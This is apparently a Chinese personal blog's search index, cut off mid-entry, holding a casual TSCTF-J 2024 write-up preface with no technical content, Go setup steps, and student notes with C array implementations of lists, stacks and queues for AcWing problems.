<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TSCTF-J 2024-WriteUp</title>
      <link href="/2024/09/tsctfwp/"/>
      <url>/2024/09/tsctfwp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本来不太想参加，毕竟前几年都是被新生赛暴打，已经被打得没脾气了。前几天zy鸽鸽突然说要打，就抱着当陪练的心态参加了，结果意外地拿了第4（zy鸽鸽第3,还是第一次打周大福，实在是tql，orz orz）。zy鸽鸽这次比赛几乎a穿了web的题（除了zbr这个b出的题），实在🐮波一（而我只能写两道web签到，令人感慨）。在比赛过程中也学了一点东西（但不多，大多数时间都是在坐牢，少部分时间在复习已经会的东西），就记录一下吧。这篇wp中整合了我跟zy鸽鸽的wp，后续如果出官解也会放进来。</p><h2 id="评价">评价</h2><p>你邮新生赛一向以难度逆天著称（大一那一年的新生赛难度还比较正常，可惜当时我太菜了，后来每一年都很逆天，至少不太像给新生做的）。今年依旧很逆天（很多研哥都做不出来两道，比如我室友）。相比较而言，moectf就对新生很友好，希望老毕登们耗子尾汁，好好反思（逃）。</p><h2 id="后记">后记</h2><p>牛魔的xd，纯纯的cs。一整个周末全去坐牢去了，p都没干。毫无意外，周一组会被xd薄纱了。就是不知道xd老惦记他那b深度强化学习干什么玩意。<br>不过破万法那道题确实卡了太久了，没想到最后倒在小小的recv上，不然我可以高高兴兴地去做项目（touching fish）。只想说一句我pwn你🐎。附pwn出题人在wp结尾的吐槽<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-26%20011956.png" alt="官方吐槽，最为致命"><br>还有看完官解以后，我只想用一句话表达我对ctf的热爱，我c(**)似t(a)的f(ather)</p>]]></content>
      
      
      <categories>
          
          <category> sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言基础</title>
      <link href="/2023/07/ez-golang/"/>
      <url>/2023/07/ez-golang/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建">环境搭建</h2><h3 id="Linux">Linux</h3><p>官网下载安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pkg.go.dev/cmd/go</span><br></pre></td></tr></table></figure><p>使用wsl演示<br>将安装包解压到<code>/usr/local</code>目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -C /usr/local -xzf go1.20.6.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>修改<code>~/.bashrc</code>文件，添加以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure><p>重新加载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>查看Go版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="Windows">Windows</h3><p>后续再补</p><h3 id="编辑器">编辑器</h3><p>Goland or VS code</p><h2 id="基本语法">基本语法</h2>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>algo_learn_1</title>
      <link href="/2023/07/algo-learn-1/"/>
      <url>/2023/07/algo-learn-1/</url>
      
        <content type="html"><![CDATA[<p>并非合理的实现，只是方便通过笔试</p><h2 id="一、单链表">一、单链表</h2><p>定义略<br>操作代码<br>做题的时候经常拿数组模拟链表（防止超时）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e[N]存储值，ne[N]存储对应索引的节点下一个节点的索引</span></span><br><span class="line"><span class="comment">// idx指当前操作的数组索引，head为头节点,即处于链表头部的节点索引</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1表示指向空</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入索引为k的节点之后</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除索引为k后面的节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing826更适合用数组模拟链表，因为题目要求的插入操作都是对第k个插入的数插入。使用普通的链表找不到插入的顺序关系<br><a href="https://www.acwing.com/problem/content/828/">原文链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1表示指向空</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入索引为k的节点之后</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除索引为k后面的节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="type">int</span> x, k;</span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, a);</span></span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span>)&#123;</span><br><span class="line">            x = atoi(a + <span class="number">2</span>);</span><br><span class="line">            insert_head(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">0</span>) &#123;head = ne[head];&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;remove_node(k);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            x = atoi(a+i+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// printf(&quot;%d&quot;,x);</span></span><br><span class="line">            insert(k, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = head;</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = ne[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、双链表">二、双链表</h2><p>特点：链表中每一个元素均指向前一节点和后一节点<br>操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   e[N]为元素值</span></span><br><span class="line"><span class="comment">   f[N]为前向指针数组，值为前一元素的索引，b[N]为后向指针，指向后一元素索引</span></span><br><span class="line"><span class="comment">   假定恒为头节点索引为0，尾节点索引恒为1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 尾节点无后向</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 头节点无前向</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k右侧插入，等价于在b[k]的左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点之后，等价于在头节点右侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入尾节点之前，等价于在为节点做出插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 827双链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 尾节点无后向</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 头节点无前向</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k右侧插入，等价于在b[k]的左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点之后，等价于在头节点右侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入尾节点之前，等价于在为节点做出插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> x, k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="keyword">switch</span>(a[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">               x = atoi(a + <span class="number">2</span>);</span><br><span class="line">               head_insert(x);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                x = atoi(a + <span class="number">2</span>);</span><br><span class="line">                tail_insert(x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                k = atoi(a + <span class="number">2</span>);</span><br><span class="line">                delete_node(k + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                </span><br><span class="line">                k = atoi(a + <span class="number">3</span>);</span><br><span class="line">                <span class="type">int</span> i = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                x = atoi(a + i + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(a[<span class="number">1</span>] == <span class="string">&#x27;L&#x27;</span>) front_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">else</span> back_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = b[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、栈">三、栈</h2><p>特点：先进后出<br>数组实现栈，此处栈开的足够大，不考虑溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Acwing 828模拟栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">15</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty()) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、队列">四、队列</h2><p>特点：先进后出<br>操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 829模拟队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 